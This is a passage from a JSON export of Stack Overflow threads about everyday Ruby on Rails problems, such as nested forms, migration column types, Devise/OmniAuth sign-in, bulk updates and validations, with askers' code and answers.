"https://stackoverflow.com/users/9026514/fly"}, "edited": false, "score": 0, "creation_date": 1512040915, "post_id": 47560063, "comment_id": 82101386, "body": "thank you for your answer. You are right, I want to create the Voting with its Options one the same new.html.erb page and then show the Voting with its Options on the same show.html.erb... I think your answer is leading into the right direction, but it still won&#39;t work. (I also went through your linked rails guides again). I will edit the question to update it to my current status and add more detailed information."}, {"owner": {"reputation": 302, "user_id": 1584664, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/095160eefd3dbd22195a0f7c402693ba?s=128&d=identicon&r=PG", "display_name": "Kavitha", "link": "https://stackoverflow.com/users/1584664/kavitha"}, "reply_to_user": {"reputation": 11, "user_id": 9026514, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0c92c1e3397d4e4be58d4e69958cf4b0?s=128&d=identicon&r=PG&f=1", "display_name": "Fly", "link": "https://stackoverflow.com/users/9026514/fly"}, "edited": false, "score": 0, "creation_date": 1512143074, "post_id": 47560063, "comment_id": 82151478, "body": "Use form_for instead of form_with to get things working for now. But be aware that form_with is soft-deprecated, that is, form_for will not be supported in future rails&#39; version. I have edited the original answer with the working solution."}], "tags": [], "owner": {"reputation": 302, "user_id": 1584664, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/095160eefd3dbd22195a0f7c402693ba?s=128&d=identicon&r=PG", "display_name": "Kavitha", "link": "https://stackoverflow.com/users/1584664/kavitha"}, "is_accepted": false, "score": 0, "last_activity_date": 1512143159, "last_edit_date": 1512143159, "creation_date": 1511982613, "answer_id": 47560063, "question_id": 47556587, "link": "https://stackoverflow.com/questions/47556587/ruby-on-rails-5-1-4-couldnt-find-model-id/47560063#47560063", "title": "Ruby on Rails 5.1.4 couldn&#39;t find Model id", "body": "<p>I'm assuming that you are trying to show voting model with it's options.</p>\n\n<p>So the RESTful URL is <code>/voting/&lt;voting_id&gt;</code>. If options are included in routes.rb as nested resource to Voting, to show a particular option, it is <code>/voting/&lt;voting_id&gt;/options/&lt;option_id&gt;</code></p>\n\n<p>For example, in <code>localhost:3000/voting/1/options/20</code> </p>\n\n<blockquote>\n  <p>1 is the id of voting and 20 is the id of option</p>\n</blockquote>\n\n<p>So you need to change show method as:</p>\n\n<pre><code>def show\n    @voting = Voting.find(params[:id])\n    @options = @voting.options # Here it fetches all options for voting of the id passed \nend\n</code></pre>\n\n<p>I'd also suggest modifying the voting_params method as:</p>\n\n<pre><code>def vote_params\n    params.require(:voting).permit(:content, options_attributes: [:id, :vote])\nend\n</code></pre>\n\n<p>As you have multiple options for a single voting, you need to whitelist the id of every option, else it'll override. You can read more on this <a href=\"http://api.rubyonrails.org/classes/ActionController/StrongParameters.html\" rel=\"nofollow noreferrer\">here</a>.</p>\n\n<p>The model association you have is very similar to the example in <strong><a href=\"http://guides.rubyonrails.org/getting_started.html#adding-a-second-model\" rel=\"nofollow noreferrer\">rails guides</a></strong>. Read it and reuse the code for a start.</p>\n\n<p><strong>EDIT:</strong></p>\n\n<p>I suggest using form_for(is soft-deprecated in rails 5) instead of form_with for things to work, for now.\nYour votings/new.html.erb will look like:</p>\n\n<pre><code>&lt;h1&gt;create new poll&lt;/h1&gt;\n\n&lt;%= &lt;%= form_for @voting do |form| %&gt; %&gt;\n    &lt;p&gt;\n      &lt;%= form.label :voting %&gt;&lt;br&gt;\n      &lt;%= form.text_area :content %&gt;\n    &lt;/p&gt;\n    &lt;p&gt;\n      &lt;%= form.fields_for :option do |option| %&gt;\n          &lt;%= option.label 'Optionen' %&gt;&lt;br&gt;\n          &lt;%= option.text_field :vote %&gt;\n      &lt;% end %&gt;\n    &lt;/p&gt;\n    &lt;p&gt;\n      &lt;%= form.submit %&gt;\n    &lt;/p&gt;\n&lt;% end %&gt;\n</code></pre>\n\n<p>Using form_with simply like this didn't work for me as auto-generation of ids is not supported with form_with. But hold on to your refactoring until rails 5.2 releases and form_for can be replaced with form_with. This is an inference from <a href=\"https://github.com/rails/rails/commit/d3893ec38ec61282c2598b01a298124356d6b35a\" rel=\"nofollow noreferrer\">this rails commit</a></p>\n"}], "owner": {"reputation": 11, "user_id": 9026514, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0c92c1e3397d4e4be58d4e69958cf4b0?s=128&d=identicon&r=PG&f=1", "display_name": "Fly", "link": "https://stackoverflow.com/users/9026514/fly"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 153, "favorite_count": 0, "answer_count": 3, "score": 1, "last_activity_date": 1512143159, "creation_date": 1511970164, "last_edit_date": 1512042636, "question_id": 47556587, "link": "https://stackoverflow.com/questions/47556587/ruby-on-rails-5-1-4-couldnt-find-model-id", "title": "Ruby on Rails 5.1.4 couldn&#39;t find Model id", "body": "<p>okay, I'm a newbie to Rails and I don't have too much experience with coding in general, so maybe this seems stupid, but here's my problem:</p>\n\n<p><strong>I edited the code, so here is an update of my current status, including more information:</strong></p>\n\n<p>Voting &amp; Option Model:</p>\n\n<pre><code>class Voting &lt; ApplicationRecord\n  has_many :options\n  validates :vote, presence: true\n  accepts_nested_attributes_for :options\nend\n\nclass Option &lt; ApplicationRecord\n  belongs_to :voting\nend\n</code></pre>\n\n<p>routes.rb:</p>\n\n<pre><code>Rails.application.routes.draw do\n  resources :votings do\n    resources :options\n  end\n  root 'votings#new'\nend\n</code></pre>\n\n<p>votings/new.html.erb:</p>\n\n<pre><code>&lt;h1&gt;create new poll&lt;/h1&gt;\n\n&lt;%= form_with scope: :voting, url: votings_path, local: true do |form| %&gt;\n    &lt;p&gt;\n      &lt;%= form.label :voting %&gt;&lt;br&gt;\n      &lt;%= form.text_area :content %&gt;\n    &lt;/p&gt;\n    &lt;p&gt;\n      &lt;%= form.fields_for :option do |option| %&gt;\n          &lt;%= option.label 'Optionen' %&gt;&lt;br&gt;\n          &lt;%= option.text_field :vote %&gt;\n      &lt;% end %&gt;\n    &lt;/p&gt;\n    &lt;p&gt;\n      &lt;%= form.submit %&gt;\n    &lt;/p&gt;\n&lt;% end %&gt;\n</code></pre>\n\n<p>votings/show.html.erb:</p>\n\n<pre><code>&lt;p&gt;\n  &lt;strong&gt;Your Voting:&lt;/strong&gt;\n  &lt;%= @voting.content %&gt;\n&lt;/p&gt;\n&lt;ul&gt;\n  &lt;p&gt;\n  &lt;%= @options.vote %&gt;\n  &lt;/p&gt;\n&lt;/ul&gt;\n</code></pre>\n\n<p>votings_controller.rb:   </p>\n\n<pre><code> class VotingsController &lt; ApplicationController\n      def show\n        @voting = Voting.find(params[:id])\n        @options = @voting.options\n      end\n\n      def new\n        @voting = Voting.new\n        @voting.options.build\n  end\n\n  def create\n    @voting = Voting.new(voting_params)\n    @voting.save\n    redirect_to @voting\n  end\n\n  private\n  def voting_params\n    params.require(:voting).permit(:content, options_attributes: [:id, :vote])\n  end\nend\n</code></pre>\n\n<p>options_controller.rb:</p>\n\n<pre><code>class OptionsController &lt; ApplicationController\n  def create\n    @voting = Voting.find(params[:id])\n    @options = @voting.options.create(option_params)\n    redirect_to voting_path(@voting)\n  end\n\n  private\n  def option_params\n    params.require(:option).permit(:vote)\n  end\nend\n</code></pre>\n\n<p>(I think some of the code in the options controller double with the votings controller and I'm not even sure if it's needed).</p>\n\n<p>So, I want to create a voting with its associated options within the same page and after that show the voting with its options on the same page (voting/new.html.erb &amp; voting/show.html.erb).</p>\n\n<p>This is my current error message:</p>\n\n<blockquote>\n  <p>NoMethodError in VotingsController#create</p>\n  \n  <p>undefined method `vote' for #Voting:0x0000000be55208</p>\n</blockquote>\n\n<p>(this shows up after submitting the content from the form.)\nSo, the form new.html.erb works fine so far.</p>\n\n<p>It seems that he doesn't know what to do the 'vote' in </p>\n\n<pre><code>&lt;%= @options.vote %&gt;\n</code></pre>\n\n<p>from the show.html.erb</p>\n\n<p>I hope the further information will help getting this problem solved.</p>\n"}, {"tags": ["ruby-on-rails", "ruby", "postgresql", "ruby-on-rails-5", "mariadb"], "answers": [{"comments": [{"owner": {"reputation": 2960, "user_id": 7426461, "user_type": "registered", "accept_rate": 66, "profile_image": "https://i.stack.imgur.com/Ldwxy.jpg?s=128&g=1", "display_name": "Cannon Moyer", "link": "https://stackoverflow.com/users/7426461/cannon-moyer"}, "edited": false, "score": 0, "creation_date": 1511970546, "post_id": 47556662, "comment_id": 82070714, "body": "Does this cause any issues with Rails though? Will expected rails functionality stop working due to not using add_reference in the relationship?"}, {"owner": {"reputation": 3307, "user_id": 2266827, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/Frcc8.png?s=128&g=1", "display_name": "jeffdill2", "link": "https://stackoverflow.com/users/2266827/jeffdill2"}, "reply_to_user": {"reputation": 2960, "user_id": 7426461, "user_type": "registered", "accept_rate": 66, "profile_image": "https://i.stack.imgur.com/Ldwxy.jpg?s=128&g=1", "display_name": "Cannon Moyer", "link": "https://stackoverflow.com/users/7426461/cannon-moyer"}, "edited": false, "score": 0, "creation_date": 1511970784, "post_id": 47556662, "comment_id": 82070885, "body": "Not at all. <code>add_reference</code> is just syntactic sugar for <code>add_column</code> and, optionally, <code>add_index</code> and <code>add_foreign_key</code>."}], "tags": [], "owner": {"reputation": 3307, "user_id": 2266827, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/Frcc8.png?s=128&g=1", "display_name": "jeffdill2", "link": "https://stackoverflow.com/users/2266827/jeffdill2"}, "is_accepted": true, "score": 4, "last_activity_date": 1511971997, "last_edit_date": 1511971997, "creation_date": 1511970411, "answer_id": 47556662, "question_id": 47556557, "link": "https://stackoverflow.com/questions/47556557/rails-5-migration-data-type-issue/47556662#47556662", "title": "Rails 5 Migration Data Type Issue", "body": "<p>You can just specify the exact data type you want, instead of using <code>add_reference</code>.</p>\n\n<pre><code>add_column :carts, :admin_id, :integer, limit: 4\nadd_foreign_key :carts, :admins\n</code></pre>\n\n<p>The <code>limit: 4</code> parameter is telling the database to create a 4-byte field, which would correspond to INT, as opposed to <code>limit: 8</code> (apparently the default now), which would correspond to BIGINT.</p>\n\n<p>As I mentioned in the comments, this will not create any issues by not using <code>add_reference</code>, since <code>add_reference</code> is just \"syntactic sugar\" for <code>add_column</code> and, optionally, <code>add_index</code> and <code>add_foreign_key</code>.</p>\n"}], "owner": {"reputation": 2960, "user_id": 7426461, "user_type": "registered", "accept_rate": 66, "profile_image": "https://i.stack.imgur.com/Ldwxy.jpg?s=128&g=1", "display_name": "Cannon Moyer", "link": "https://stackoverflow.com/users/7426461/cannon-moyer"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 722, "favorite_count": 0, "accepted_answer_id": 47556662, "answer_count": 1, "score": 3, "last_activity_date": 1511973093, "creation_date": 1511970091, "last_edit_date": 1511973093, "question_id": 47556557, "link": "https://stackoverflow.com/questions/47556557/rails-5-migration-data-type-issue", "title": "Rails 5 Migration Data Type Issue", "body": "<p>I originally developed my rails 5 application using PostgreSQL. I had to change over to a MariaDB after I had done all of my development due to some issues with hosting. </p>\n\n<p>I'm trying to put in an update that adds a reference to the admin from my shopping cart. Here is my migration:</p>\n\n<pre><code>class AddAdminRefToCart &lt; ActiveRecord::Migration[5.1]\n  def change\n    add_reference :carts, :admin, foreign_key: true\n  end\nend\n</code></pre>\n\n<p>when I run </p>\n\n<pre><code>rake db:migrate\n</code></pre>\n\n<p>I get this error:</p>\n\n<pre><code>== 20171129152942 AddAdminRefToCart: migrating ================================\n-- add_reference(:carts, :admin, {:foreign_key=&gt;true})\nrake aborted!\nStandardError: An error has occurred, all later migrations canceled:\n\nColumn `admin_id` on table `carts` has a type of `bigint(20)`.\nThis does not match column `id` on `admins`, which has type `int(11)`.\nTo resolve this issue, change the type of the `admin_id` column on `carts` to be :integer. (For example `t.integer admin_id`).\n</code></pre>\n\n<p>The error makes sense but I am unsure of the proper way to fix the issue. Can someone please give some guidance on how I should write my migration? Thanks in advance!</p>\n"}, {"tags": ["ruby-on-rails", "ruby", "facebook", "devise", "omniauth"], "owner": {"reputation": 512, "user_id": 6950578, "user_type": "registered", "accept_rate": 35, "profile_image": "https://www.gravatar.com/avatar/2d06a05f48e9f4b810136e8a4348c014?s=128&d=identicon&r=PG&f=1", "display_name": "john", "link": "https://stackoverflow.com/users/6950578/john"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 34, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1511968858, "creation_date": 1511968858, "question_id": 47556153, "link": "https://stackoverflow.com/questions/47556153/user-is-not-sign-in-as-devise-user-when-authenticated-from-omniauth-facebook", "title": "user is not sign in as devise user when authenticated from omniauth facebook?", "body": "<p>I have integrated the omniauth-facebook in my application to authenticate the user. It is working fine but there is one problem that user is not sign in as devise user. I am following this tutorial <a href=\"https://github.com/plataformatec/devise/wiki/OmniAuth:-Overview\" rel=\"nofollow noreferrer\">Devise omniauth integration</a>\nThere are so many problems I am facing. The first thing is that all the conditions that should be true for the signed in user are false like </p>\n\n<p><code>if user_signed_in?</code> is false <code>current_user</code> is empty so it means the user is not signed in after authenticated.</p>\n\n<p>Omniauth controller callback method code is </p>\n\n<pre><code>def facebook\n    # You need to implement the method below in your model (e.g. app/models/user.rb)\n\n    @user  = User.from_omniauth(request.env[\"omniauth.auth\"])\n    if @user.persisted?\n      sign_in(:user, @user)\n      redirect_to :controller =&gt; '/donations', :action =&gt; 'donor_history'\n\n      set_flash_message(:notice, :success, :kind =&gt; \"Facebook\") if is_navigational_format?\n    else\n      session[\"devise.facebook_data\"] = request.env[\"omniauth.auth\"]\n      redirect_to new_user_registration_url\n    end\n  end\n</code></pre>\n\n<p>Application controller code is this</p>\n\n<pre><code>class ApplicationController &lt; ActionController::Base\n  add_flash_types :success, :warning, :danger, :info\n  protect_from_forgery prepend: true\n  before_filter :configure_permitted_parameters, if: :devise_controller?\n  layout :layout_by_resource\n\n\n\n def current_user\n    @current_user ||= User.find(session[:user_id]) if session[:user_id]\n  end\n  helper_method :current_user\n\n  private\n\n  def layout_by_resource\n    if devise_controller?\n      \"admin\"\n    else\n      \"application\"\n    end\n  end\n\n  protected\n\n  def after_sign_in_path_for(resource)\n    #request.env['omniauth.origin'] || root_path\n    if(resource.admin==false)\n      '/donations/donor_history'\n    else\n      '/admins/' #your path\n    end\n  end\n\n  def after_sign_out_path_for(resource)\n    '/users/sign_in' #your path\n  end\n\n  def configure_permitted_parameters\n    devise_parameter_sanitizer.permit(:sign_up) do |user_params|\n      user_params.permit(:admin, :email, :password, :password_confirmation,:first_name,:last_name)\n    end\n    devise_parameter_sanitizer.permit(:account_update) do |user_params|\n      user_params.permit(:admin, :email, :password, :password_confirmation,:current_password,:first_name,:last_name)\n    end\n  end\n\nend\n</code></pre>\n\n<p>Any help would be highly appreciated.Thanks</p>\n"}, {"tags": ["ruby", "raspberry-pi", "dashing"], "comments": [{"owner": {"reputation": 23016, "user_id": 2981429, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/ZcCXx.jpg?s=128&g=1", "display_name": "max pleaner", "link": "https://stackoverflow.com/users/2981429/max-pleaner"}, "edited": false, "score": 0, "creation_date": 1511972118, "post_id": 47556042, "comment_id": 82071802, "body": "why don&#39;t you <code>cd</code> from the script?"}], "answers": [{"tags": [], "owner": {"reputation": 1280, "user_id": 3614563, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dd48fa4e1fc92792a82bdcae6ad40eaa?s=128&d=identicon&r=PG&f=1", "display_name": "George Koehler", "link": "https://stackoverflow.com/users/3614563/george-koehler"}, "is_accepted": true, "score": 1, "last_activity_date": 1512094466, "creation_date": 1512094466, "answer_id": 47585670, "question_id": 47556042, "link": "https://stackoverflow.com/questions/47556042/move-to-directory-and-run-smashing-dashing-from-that-directory/47585670#47585670", "title": "Move to Directory and Run Smashing/Dashing from that Directory", "body": "<p>Your <code>cd \"/home/pi/test\"</code> didn't work because <code>cd</code> is a shell built-in.  It changed the directory in the shell, but not in Ruby.</p>\n\n<p>To change the directory in Ruby, use</p>\n\n<pre><code>Dir.chdir '/home/pi/test'\n</code></pre>\n\n<p>Each process has its own current directory.  Ruby's <code>Kernel#system</code> spawned a shell process (probably <code>/bin/sh</code>) to run the command, then waited for the shell to exit.  The shell changed directory, then exited.  Ruby never changed directory.</p>\n"}], "owner": {"reputation": 37, "user_id": 7401669, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/747f0e206e67591c7ab7e81a28ecbf0d?s=128&d=identicon&r=PG", "display_name": "Alex Arthur", "link": "https://stackoverflow.com/users/7401669/alex-arthur"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 387, "favorite_count": 0, "accepted_answer_id": 47585670, "answer_count": 1, "score": 1, "last_activity_date": 1512094466, "creation_date": 1511968495, "last_edit_date": 1512047711, "question_id": 47556042, "link": "https://stackoverflow.com/questions/47556042/move-to-directory-and-run-smashing-dashing-from-that-directory", "title": "Move to Directory and Run Smashing/Dashing from that Directory", "body": "<p>I am attempting to automatically start my Smashing Dashboard when my Raspberry Pi boots. I plan to run a script through the @reboot option in crontab (similarily to how I already automatically shutdown the dashboard). However I'm having trouble running the script below.</p>\n\n<pre><code>    command  = 'cd \"/home/pi/test\"' \n    command2 = 'smashing start'\n\n\n    system \"echo hi\"\n    system command\n    puts command\n    system \"echo Movement\"\n    system command2\n    puts command2\n\nThe script itself is just being run from the terminal just now using \n\n    ruby /home/pi/start_up.rb. \n</code></pre>\n\n<p>Starting Smashing appears to fail because the working directory is not moved through the <code>cd \"home/pi/test\"</code>command as when the script is run I recieve the following error</p>\n\n<pre><code>Could not locate Gemfile or .bundle/ directory\n</code></pre>\n\n<p>There certainly is a Gemfile in the Test directory. This is the same error I get if I run <code>smashing start</code> directly from the home/pi folder suggesting that folder is never moved. Is there a correct way to do this?\nAny advice would be greatly appreciated.</p>\n"}, {"tags": ["ruby-on-rails", "ruby"], "comments": [{"owner": {"reputation": 28612, "user_id": 5025116, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7WdYi.jpg?s=128&g=1", "display_name": "Sebastian Palma", "link": "https://stackoverflow.com/users/5025116/sebastian-palma"}, "edited": false, "score": 0, "creation_date": 1511967663, "post_id": 47555755, "comment_id": 82068496, "body": "This isn&#39;t clear, could you elaborate your question?"}, {"owner": {"reputation": 52685, "user_id": 980550, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/8emhY.jpg?s=128&g=1", "display_name": "lurker", "link": "https://stackoverflow.com/users/980550/lurker"}, "edited": false, "score": 3, "creation_date": 1511967677, "post_id": 47555755, "comment_id": 82068510, "body": "Umm.... did you try <code>.to_i</code>? <i>e.g.</i>, <code>&quot;-87&quot;.to_i</code>. Just read a little of the Ruby documentation."}, {"owner": {"reputation": 1, "user_id": 9026340, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-p8EFWkQdre4/AAAAAAAAAAI/AAAAAAAAABk/1CkEgIdpT54/photo.jpg?sz=128", "display_name": "Eric Whalen", "link": "https://stackoverflow.com/users/9026340/eric-whalen"}, "edited": false, "score": 0, "creation_date": 1511988914, "post_id": 47555755, "comment_id": 82080991, "body": "I apologize, but my experience with ruby is only about 5 hours older than my original post.  The problem I am trying to solve is that my return value is a string and I need it to be an integer so that I can do math on it.  I hope that helps to clarify..."}], "answers": [{"tags": [], "owner": {"reputation": 616, "user_id": 2675376, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000498640121/picture?type=large", "display_name": "Juan Manuel Rodulfo Salcedo", "link": "https://stackoverflow.com/users/2675376/juan-manuel-rodulfo-salcedo"}, "is_accepted": false, "score": 3, "last_activity_date": 1511967736, "creation_date": 1511967736, "answer_id": 47555809, "question_id": 47555755, "link": "https://stackoverflow.com/questions/47555755/ruby-convert-string-with-negative-number-to-int/47555809#47555809", "title": "Ruby - convert string with negative number to int", "body": "<pre><code>irb(main):001:0&gt; \"-3\".to_i\n=&gt; -3\n</code></pre>\n"}], "owner": {"reputation": 1, "user_id": 9026340, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-p8EFWkQdre4/AAAAAAAAAAI/AAAAAAAAABk/1CkEgIdpT54/photo.jpg?sz=128", "display_name": "Eric Whalen", "link": "https://stackoverflow.com/users/9026340/eric-whalen"}, "delete_vote_count": 1, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 794, "favorite_count": 0, "closed_date": 1511969911, "answer_count": 1, "score": -9, "last_activity_date": 1512122107, "creation_date": 1511967562, "last_edit_date": 1512122107, "question_id": 47555755, "link": "https://stackoverflow.com/questions/47555755/ruby-convert-string-with-negative-number-to-int", "closed_reason": "Needs details or clarity", "title": "Ruby - convert string with negative number to int", "body": "<p>I have a query on a parameter that always returns a negative number, but as a string.  </p>\n\n<p>I need to convert that to an <code>int</code> so that I can use it.</p>\n\n<pre><code> Parameter = InternetGatewayDevice.SystemConfig.Status.ModemStatus.RSRP\n Value = -87 (as string)\n</code></pre>\n\n<p>For example, when I run my query an the parameter above, I get the return value of <code>-87</code> presented as a <code>string</code>. </p>\n\n<p>How do I convert that <code>string</code> to an <code>integer</code> so that I can perform mathematical calculations on it?</p>\n"}, {"tags": ["ruby-on-rails", "ruby", "ruby-on-rails-5"], "comments": [{"owner": {"reputation": 16672, "user_id": 22237, "user_type": "registered", "accept_rate": 76, "profile_image": "https://i.stack.imgur.com/hkobD.png?s=128&g=1", "display_name": "Kris", "link": "https://stackoverflow.com/users/22237/kris"}, "edited": false, "score": 0, "creation_date": 1511969545, "post_id": 47555202, "comment_id": 82069940, "body": "One option is to create an ActiveModel &quot;form object&quot; which is submitted to a controller which validates the form and then updates various models. Another might be &quot;nested attributes&quot;, although in my experience using nested attributes never works out too well."}], "answers": [{"tags": [], "owner": {"reputation": 616, "user_id": 2675376, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000498640121/picture?type=large", "display_name": "Juan Manuel Rodulfo Salcedo", "link": "https://stackoverflow.com/users/2675376/juan-manuel-rodulfo-salcedo"}, "is_accepted": false, "score": 1, "last_activity_date": 1511966775, "creation_date": 1511966775, "answer_id": 47555480, "question_id": 47555202, "link": "https://stackoverflow.com/questions/47555202/editing-updating-multiple-objects-at-a-time-on-a-single-page/47555480#47555480", "title": "Editing/Updating multiple objects at a time on a single page", "body": "<p>Create a form_for to a new endpoint (not the default PUT one), you are not updating 1 resource, that endpoint makes nonsense to be used.</p>\n\n<p>PUT /resource/bulk (for example)</p>\n\n<p>html (i haven't tested this it is just a scheme):</p>\n\n<pre><code>form_tag '/resource/bulk', method: :put do\n  @resources.each do |resource|\n    text_field_tag(\"#{resource.id}[email]\")\n  end\nend\n</code></pre>\n\n<p>action:</p>\n\n<pre><code>#params =&gt; { 1 =&gt; { \"email\" =&gt; \"foo@foo.com\" }, 2 =&gt; { \"email\" =&gt; \"bar@bar.com\" } }\ndef bulk\n  resources = params[:form]\n  Resource.update(resources.keys, resources.values)\nend\n</code></pre>\n\n<p>this is just a schema of a valid solution, I don't have any Rails app or irb right now to test this solution.</p>\n"}], "owner": {"reputation": 105, "user_id": 9026232, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/eb67b65463a0cc4f3fc83c4712f8349a?s=128&d=identicon&r=PG&f=1", "display_name": "Rakori", "link": "https://stackoverflow.com/users/9026232/rakori"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 854, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1511970113, "creation_date": 1511965910, "last_edit_date": 1511970113, "question_id": 47555202, "link": "https://stackoverflow.com/questions/47555202/editing-updating-multiple-objects-at-a-time-on-a-single-page", "title": "Editing/Updating multiple objects at a time on a single page", "body": "<p>I want to be able to edit / update multiple objects at a time, i.e. a page to render an email field for all users.</p>\n\n<p>The standard approach doesn't work: </p>\n\n<ul>\n<li><p><code>form_for</code> requires a single object with an <code>id</code></p></li>\n<li><p>a <code>:put</code> request to the <code>user_path</code> also requires an <code>id</code> parameter</p></li>\n</ul>\n\n<p>How can I generate a form to update multiple users? I want to use only the built-in Rails form, not a third-party one.</p>\n"}, {"tags": ["ruby-on-rails", "ruby"], "comments": [{"owner": {"reputation": 8640, "user_id": 4055042, "user_type": "registered", "accept_rate": 76, "profile_image": "https://www.gravatar.com/avatar/cd04c63d95d27033b53d4d83fea40c02?s=128&d=identicon&r=PG&f=1", "display_name": "SRack", "link": "https://stackoverflow.com/users/4055042/srack"}, "edited": false, "score": 0, "creation_date": 1511962173, "post_id": 47553985, "comment_id": 82064558, "body": "Can you post your model validations please?"}, {"owner": {"reputation": 1, "user_id": 8932383, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-NS9k0O-Ra_M/AAAAAAAAAAI/AAAAAAAAAXg/PilkgzzSoYI/photo.jpg?sz=128", "display_name": "Inioluwa Akinleye", "link": "https://stackoverflow.com/users/8932383/inioluwa-akinleye"}, "reply_to_user": {"reputation": 8640, "user_id": 4055042, "user_type": "registered", "accept_rate": 76, "profile_image": "https://www.gravatar.com/avatar/cd04c63d95d27033b53d4d83fea40c02?s=128&d=identicon&r=PG&f=1", "display_name": "SRack", "link": "https://stackoverflow.com/users/4055042/srack"}, "edited": false, "score": 0, "creation_date": 1511962374, "post_id": 47553985, "comment_id": 82064681, "body": "I have updated the question with the model validations"}], "answers": [{"comments": [{"owner": {"reputation": 1, "user_id": 8932383, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-NS9k0O-Ra_M/AAAAAAAAAAI/AAAAAAAAAXg/PilkgzzSoYI/photo.jpg?sz=128", "display_name": "Inioluwa Akinleye", "link": "https://stackoverflow.com/users/8932383/inioluwa-akinleye"}, "edited": false, "score": 0, "creation_date": 1511962802, "post_id": 47554166, "comment_id": 82065014, "body": "Yes i understand you, the phonelibs gem already added that validation somehow, so i wanna test for it that a user must input only 11 digits, not less, not more, not sure of the test code i have up there"}, {"owner": {"reputation": 8640, "user_id": 4055042, "user_type": "registered", "accept_rate": 76, "profile_image": "https://www.gravatar.com/avatar/cd04c63d95d27033b53d4d83fea40c02?s=128&d=identicon&r=PG&f=1", "display_name": "SRack", "link": "https://stackoverflow.com/users/4055042/srack"}, "reply_to_user": {"reputation": 1, "user_id": 8932383, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-NS9k0O-Ra_M/AAAAAAAAAAI/AAAAAAAAAXg/PilkgzzSoYI/photo.jpg?sz=128", "display_name": "Inioluwa Akinleye", "link": "https://stackoverflow.com/users/8932383/inioluwa-akinleye"}, "edited": false, "score": 0, "creation_date": 1511963160, "post_id": 47554166, "comment_id": 82065266, "body": "Thanks - I&#39;ve updated my answer to reflect this. Hope it helps @InioluwaAkinleye"}, {"owner": {"reputation": 1, "user_id": 8932383, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-NS9k0O-Ra_M/AAAAAAAAAAI/AAAAAAAAAXg/PilkgzzSoYI/photo.jpg?sz=128", "display_name": "Inioluwa Akinleye", "link": "https://stackoverflow.com/users/8932383/inioluwa-akinleye"}, "edited": false, "score": 0, "creation_date": 1511964421, "post_id": 47554166, "comment_id": 82066126, "body": "Thank you @SRack, but the test isnt still failing when i add, say 12 or 13. It still passes"}, {"owner": {"reputation": 8640, "user_id": 4055042, "user_type": "registered", "accept_rate": 76, "profile_image": "https://www.gravatar.com/avatar/cd04c63d95d27033b53d4d83fea40c02?s=128&d=identicon&r=PG&f=1", "display_name": "SRack", "link": "https://stackoverflow.com/users/4055042/srack"}, "reply_to_user": {"reputation": 1, "user_id": 8932383, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-NS9k0O-Ra_M/AAAAAAAAAAI/AAAAAAAAAXg/PilkgzzSoYI/photo.jpg?sz=128", "display_name": "Inioluwa Akinleye", "link": "https://stackoverflow.com/users/8932383/inioluwa-akinleye"}, "edited": false, "score": 0, "creation_date": 1511967472, "post_id": 47554166, "comment_id": 82068331, "body": "Just to be clear - <code>12345678999</code> should be valid, right? You&#39;ll need to dig into <code>phonelib</code>&#39;s docs to figure out what it&#39;s doing; it&#39;s likely the location you&#39;ve got it setup for accepts shorter and / or longer numbers as valid (i.e. with area codes, countries etc.). If you&#39;re intent on it being fixed at 11 digits&#39; length, just add an extra validation as in my answer. (Although correctly implementing their validations is probably the correct way to go.)"}], "tags": [], "owner": {"reputation": 8640, "user_id": 4055042, "user_type": "registered", "accept_rate": 76, "profile_image": "https://www.gravatar.com/avatar/cd04c63d95d27033b53d4d83fea40c02?s=128&d=identicon&r=PG&f=1", "display_name": "SRack", "link": "https://stackoverflow.com/users/4055042/srack"}, "is_accepted": false, "score": 0, "last_activity_date": 1511963079, "last_edit_date": 1511963079, "creation_date": 1511962600, "answer_id": 47554166, "question_id": 47553985, "link": "https://stackoverflow.com/questions/47553985/ruby-on-rails-test-for-specific-phone-number-of-digits/47554166#47554166", "title": "ruby on rails - test for specific phone number of digits", "body": "<p>You've used a couple of length validations elsewhere - I'd suggest you need the same for your <code>phonenumber</code> field before it will fail validations for being too short.</p>\n\n<p>I.E.</p>\n\n<p><code>validates_length_of :phonenumber, is: 11</code> </p>\n\n<p>or</p>\n\n<p><code>validates :phonenumber, length: { is: 11 }</code></p>\n\n<p>or using a regex:</p>\n\n<p><code>validates_format_of :phonenumber, with: /[0-9]{11}/</code></p>\n\n<p>Docs can be found <a href=\"http://guides.rubyonrails.org/active_record_validations.html#length\" rel=\"nofollow noreferrer\">here</a> - hope that helps!</p>\n\n<p><code>PhoneLib</code> has a lot of extra functionality based on countries and their phone number formats - the <em>best</em> approach here would be to dig properly into that and use their validations based on either a fixed or user-based 